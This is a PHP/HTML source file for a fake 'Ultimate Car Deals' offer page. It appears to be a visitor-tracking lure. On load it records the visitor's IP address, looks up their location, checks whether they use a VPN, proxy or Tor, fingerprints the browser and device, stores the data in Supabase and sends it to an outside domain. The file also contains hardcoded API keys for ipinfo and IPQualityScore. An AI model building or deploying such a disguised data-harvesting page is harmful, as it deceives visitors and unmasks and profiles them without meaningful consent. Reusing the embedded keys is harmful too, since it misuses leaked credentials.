<?php
// Inicia a sessão (opcional, mantido para consistência)
session_start();
// Inclui a conexão com o Supabase
require_once __DIR__ . '/db_connect.php';

// Captura o IP do visitante
$visitor_ip = $_SERVER['REMOTE_ADDR'];

// Faz a requisição ao ipinfo.io usando curl
$ipinfo_url = "https://ipinfo.io/{$visitor_ip}?token=b9926cf26ae3ac";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $ipinfo_url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$ipinfo_data = curl_exec($ch);
curl_close($ch);
$ipinfo_json = $ipinfo_data ? json_decode($ipinfo_data, true) : [];

// Faz a requisição à API IPQualityScore
$api_key_ipqs = "FxJTEBwf1TN9Elh78MZqTISQMYK0qdYk"; // Sua chave real
$ipqs_url = "https://ipqualityscore.com/api/json/ip/$api_key_ipqs?ip=$visitor_ip";
$ipqs_data = @file_get_contents($ipqs_url);
$ipqs_json = $ipqs_data ? json_decode($ipqs_data, true) : [];

// Verifica Tor (opcional)
$tor_data = @file_get_contents('https://check.torproject.org/exit-addresses');
$is_tor_confirmed = $tor_data && strpos($tor_data, $visitor_ip) !== false ? "Yes (confirmed by exit node)" : "No";

// Monta as informações iniciais (usando ipinfo.io para localização)
$visitor_info = [
    "ip" => $visitor_ip,
    "location" => isset($ipinfo_json['city']) ? "{$ipinfo_json['city']}, {$ipinfo_json['region']}, {$ipinfo_json['country']}" : "Unknown",
    "is_vpn_or_proxy" => isset($ipqs_json['proxy']) && ($ipqs_json['proxy'] || $ipqs_json['vpn']) ? "Yes" : "No",
    "is_tor" => isset($ipqs_json['tor']) && $ipqs_json['tor'] ? "Yes" : $is_tor_confirmed,
    "user_agent" => $_SERVER['HTTP_USER_AGENT'],
    "browser" => "Unknown", // Será atualizado via JS
    "os" => "Unknown",
    "device_vendor" => "Not identified",
    "device_model" => "Not identified",
    "device_type" => "Unknown"
];

// Salva os dados iniciais no Supabase
$result = db_query('visitors', $visitor_info, 'POST');
if (isset($result['error'])) {
    error_log("Erro ao salvar no Supabase: " . json_encode($result));
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <!-- Ajuste o CSP para permitir scripts necessários -->
    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' https://cdnjs.cloudflare.com; script-src-elem 'self' https://cdnjs.cloudflare.com; script-src-attr 'unsafe-inline'; connect-src 'self' https://nickdwtyay.com.br">
    <title>Ultimate Car Deals - Unlock Exclusive Offers</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ua-parser-js/1.0.2/ua-parser.min.js"></script>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(to bottom, #1a1a1a, #4d4d4d);
            color: #fff;
            margin: 0;
            padding: 0;
            text-align: center;
        }
        header {
            background: url('https://source.unsplash.com/1600x400/?car,racing') no-repeat center;
            background-size: cover;
            padding: 50px 20px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.5);
        }
        h1 {
            font-size: 3em;
            text-transform: uppercase;
            letter-spacing: 2px;
            margin: 0;
            text-shadow: 2px 2px 4px #000;
        }
        .intro {
            font-size: 1.2em;
            margin: 20px 0;
            text-shadow: 1px 1px 2px #000;
        }
        .info-box {
            background: rgba(255, 255, 255, 0.1);
            border-radius: 10px;
            padding: 20px;
            margin: 20px auto;
            max-width: 600px;
            box-shadow: 0 0 15px rgba(255, 0, 0, 0.5);
        }
        pre {
            text-align: left;
            font-size: 1em;
            color: #ffcc00;
            white-space: pre-wrap;
        }
        button {
            background: #ff0000;
            color: #fff;
            border: none;
            padding: 15px 30px;
            font-size: 1.2em;
            border-radius: 5px;
            cursor: pointer;
            transition: background 0.3s;
        }
        button:hover {
            background: #cc0000;
        }
        footer {
            padding: 20px;
            font-size: 0.9em;
            color: #ccc;
        }
    </style>
</head>
<body>
    <header>
        <h1>Ultimate Car Deals</h1>
        <p class="intro">Discover exclusive offers on the hottest cars – just for you!</p>
        <button onclick="alert('Check your info below to claim your deal!')">Claim Your Offer</button>
    </header>
    <div class="info-box">
        <h2>Your Details</h2>
        <pre id="info"><?php echo json_encode($visitor_info, JSON_PRETTY_PRINT); ?></pre>
    </div>
    <footer>
        © 2025 Ultimate Car Deals | All rights reserved
    </footer>

    <script>
        // Atualiza informações do navegador, SO e dispositivo
        const parser = new UAParser();
        const result = parser.getResult();
        let visitorInfo = <?php echo json_encode($visitor_info); ?>;
        visitorInfo.browser = `${result.browser.name || "Unknown"} ${result.browser.version || ""}`;
        visitorInfo.os = `${result.os.name || "Unknown"} ${result.os.version || ""}`;
        visitorInfo.device_vendor = result.device.vendor || "Not identified";
        visitorInfo.device_model = result.device.model || "Not identified";
        visitorInfo.device_type = result.device.type || "Unknown";
        document.getElementById('info').innerHTML = JSON.stringify(visitorInfo, null, 2);

        // Envia os dados atualizados para o servidor
        fetch('https://nickdwtyay.com.br/update_visitor.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(visitorInfo)
        }).catch(error => console.error('Erro no fetch:', error));
    </script>
</body>
</html>
